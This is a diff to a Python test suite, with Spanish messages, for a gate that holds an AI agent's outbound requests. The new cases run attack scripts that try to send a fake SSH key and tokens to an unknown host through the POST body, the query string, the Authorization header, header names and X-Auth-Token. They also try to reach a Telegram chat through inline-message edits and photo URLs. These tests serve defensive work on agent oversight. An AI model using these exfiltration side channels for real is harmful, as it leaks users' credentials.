@@ -701,8 +701,25 @@ def test_a_get_that_sends_a_telegram_message_is_held(attack: Attack, lab: Lab) -
     trusted = attack.run_script(
         lab.agent, script, token, OWNER_CHAT, f"hola {owner}", "sendMessage", "30"
     )
+    # Review of T10-3: the owner's chat by the side door. An edit by inline_message_id (which
+    # Telegram reads first: it may land in any chat) and a photo given by URL (Telegram fetches
+    # it) are never trusted: held, and the client gives up.
+    inline, photo = f"{tag}-d", f"{tag}-e"
+    url = f"https://{OTHER_HOST}/{tag}/foto.png"
+    sides = [
+        attack.run_script(lab.agent, script, token, OWNER_CHAT, f"hola {inline}",
+                          "editMessageText", GAVE_UP,
+                          json.dumps({"inline_message_id": f"AgAAA{tag}"})),
+        attack.run_script(lab.agent, script, token, OWNER_CHAT, f"hola {photo}", "sendPhoto",
+                          GAVE_UP, json.dumps({"photo": url})),
+    ]  # fmt: skip
+    side_held = [gate_held_with(lab, inline), gate_held_with(lab, photo)]
+    for event in side_held:
+        ask_decide(lab.service.config.control_socket, event.details["hold_id"], "reject")
     time.sleep(1.0)
     out_a, out_b, out_c = (telegram_arrived(lab, t) for t in (stranger, mixed, owner))
+    out_side = telegram_arrived(lab, inline) + telegram_arrived(lab, photo)
+    fetched = lab.internet.requests(OTHER_HOST, f"/{tag}/")
     owner_events = [e for e in lab.service.events("request", "net")
                     if owner in str(e.details.get("path", ""))]  # fmt: skip
     owner_held = [e for e in lab.service.events("held", "gate")
@@ -711,11 +728,14 @@ def test_a_get_that_sends_a_telegram_message_is_held(attack: Attack, lab: Lab) -
     attack.check(
         "stopped",
         before == [] and len(out_a) == 1 and out_b == [] and len(out_c) == 1
-        and trusted["status"] == 200,
+        and trusted["status"] == 200 and out_side == [] and fetched == []
+        and all(side.get("status") != 200 for side in sides),
         f"el GET de sendMessage al chat 556 espera en la puerta sin llegar ({len(before)}); con "
         f"`backtide aprobar` sale una vez ({len(out_a)}). El de «SeNdMeSsAgE» al 557 no llega "
         f"nunca ({len(out_b)}). Control: al chat del dueño sale sin preguntar "
-        f"({trusted['status']}, {len(out_c)})",
+        f"({trusted['status']}, {len(out_c)}). Por la puerta de atrás, la edición por "
+        f"inline_message_id y la foto por URL al chat del dueño no llegan ({len(out_side)}; "
+        f"{[side.get('status') for side in sides]}) ni nadie pide la foto ({len(fetched)})",
     )  # fmt: skip
     every = json.dumps([[e.target, e.details] for e in lab.service.events()])
     secret = token.split(":", 1)[1]
@@ -729,10 +749,15 @@ def test_a_get_that_sends_a_telegram_message_is_held(attack: Attack, lab: Lab) -
         and owner_events[0].details.get("gate", {}).get("decision") == "trusted"
         and bool(out_c) and ts(owner_events[0]) < out_c[0]["at"]
         and owner_held == []
+        and side_held[0].details["reading"]["recipients"] == [f"inline:AgAAA{tag}"]
+        and "inline_message" in side_held[0].details["reading"]["notes"]
+        and "fetches_url" in side_held[1].details["reading"]["notes"]
+        and url in str(side_held[1].details.get("phrase"))
         and not any(piece in every for piece in pieces(secret)),
         f"gate/held con la frase del traductor: {phrases}; el del dueño, net/request "
         f"{[e.details.get('gate') for e in owner_events]} grabado antes de llegar y sin "
-        f"retención ({len(owner_held)}); ningún trozo del token del bot en la caja negra",
+        f"retención ({len(owner_held)}); ningún trozo del token del bot en la caja negra; por la "
+        f"puerta de atrás: {[e.details.get('phrase') for e in side_held]}",
     )  # fmt: skip
     attack.check(
         "risk",
@@ -763,41 +788,54 @@ def test_credentials_sent_to_an_unknown_host_are_held(attack: Attack, lab: Lab) 
         + "-----END OPENSSH PRIVATE KEY-----\n"
     )  # fmt: skip
     token = "ghp_" + made_up(36)
-    outcome = attack.run_script(lab.agent, "exfiltrar_credenciales", OTHER_HOST, tag, key, token)
+    opaque = made_up(24)  # a token the redaction cannot recognise
+    outcome = attack.run_script(
+        lab.agent, "exfiltrar_credenciales", OTHER_HOST, tag, key, token, opaque
+    )
     upload = held_at(lab, f"/{tag}/upload")
     collect = gate_held_with(lab, f"/{tag}/collect")
+    # Review of T10-3, H1: the credential headers, and the headers' names, toward this host.
+    header, by_name, unseen = (held_at(lab, f"/{tag}/{p}") for p in ("header", "name", "opaque"))
     still_open = {h["hold_id"] for h in ask_holds(lab.service.config.control_socket)}
     reject_what_is_left(lab, tag)
     time.sleep(1.0)
     got = {r["path"].split("?", 1)[0] for r in lab.internet.requests(OTHER_HOST, f"/{tag}/")}
     every = json.dumps([[e.target, e.details] for e in lab.service.events()])
-    leaked = [p for p in pieces(token) | pieces(key.split("\n")[2]) if p in every]
+    leaked = [p for p in pieces(token) | pieces(key.split("\n")[2]) | pieces(opaque)
+              if p in every]  # fmt: skip
+    helds = (upload, collect, header, by_name, unseen)
+    reasons = [e.details.get("reason") for e in helds]
     attack.check(
         "stopped",
         got == {f"/{tag}/innocent"} and outcome["control"] == 200,
-        f"la clave SSH ({outcome['key_file']}) y el token por POST ({outcome['post']}) y en la "
-        f"consulta de un GET ({outcome['get']}) no llegan a {OTHER_HOST}: allí solo llegó "
-        f"{sorted(got)}, el GET inocente de control, que pasa ({outcome['control']}: las lecturas "
-        f"a hosts desconocidos pasan desde T10-3)",
+        f"la clave SSH ({outcome['key_file']}) y el token por POST ({outcome['post']}), en la "
+        f"consulta de un GET ({outcome['get']}), en Authorization ({outcome['header']}), como "
+        f"nombre de una cabecera ({outcome['name']}) y un token opaco en X-Auth-Token "
+        f"({outcome['opaque']}) no llegan a {OTHER_HOST}: allí solo llegó {sorted(got)}, el GET "
+        f"inocente de control, que pasa ({outcome['control']}: las lecturas a hosts "
+        f"desconocidos pasan desde T10-3)",
     )
     attack.check(
         "recorded",
-        upload.details.get("method") == "POST" and collect.details.get("method") == "GET"
+        upload.details.get("method") == "POST"
+        and all(e.details.get("method") == "GET" for e in helds[1:])
+        and reasons[2:] == ["credential_secret", "header_secret", "credential_unknown_host"]
         and leaked == [],
-        f"gate/held del POST ({upload.details.get('reason')}) y del GET "
-        f"({collect.details.get('reason')}); trozos de la clave o del token en la caja negra: "
-        f"{leaked or 'ninguno'}",
+        f"gate/held de las cinco: {reasons}; trozos de la clave o de los tokens en la caja "
+        f"negra: {leaked or 'ninguno'}",
     )  # fmt: skip
+    risks = [e.risk for e in helds]
     attack.check(
         "risk",
-        upload.risk == 3 and collect.risk == 3,
-        f"el POST con la clave en el cuerpo, riesgo {upload.risk}; el GET con el token en la "
-        f"URL, riesgo {collect.risk} ({collect.details.get('reason')})",
+        risks == [3, 3, 3, 3, 2],
+        f"el POST con la clave en el cuerpo, el GET con el token en la URL, en Authorization y "
+        f"como nombre de cabecera: riesgo 3 (el tachado lo reconoce); el token opaco en "
+        f"X-Auth-Token, riesgo 2 (una credencial hacia un host que no está en la lista): {risks}",
     )
     attack.check(
         "held",
-        {upload.details["hold_id"], collect.details["hold_id"]} <= still_open,
-        f"las dos esperaban la aprobación ({sorted(still_open)}) hasta que el test las rechazó",
+        {e.details["hold_id"] for e in helds} <= still_open,
+        f"las cinco esperaban la aprobación ({sorted(still_open)}) hasta que el test las rechazó",
     )
 
 
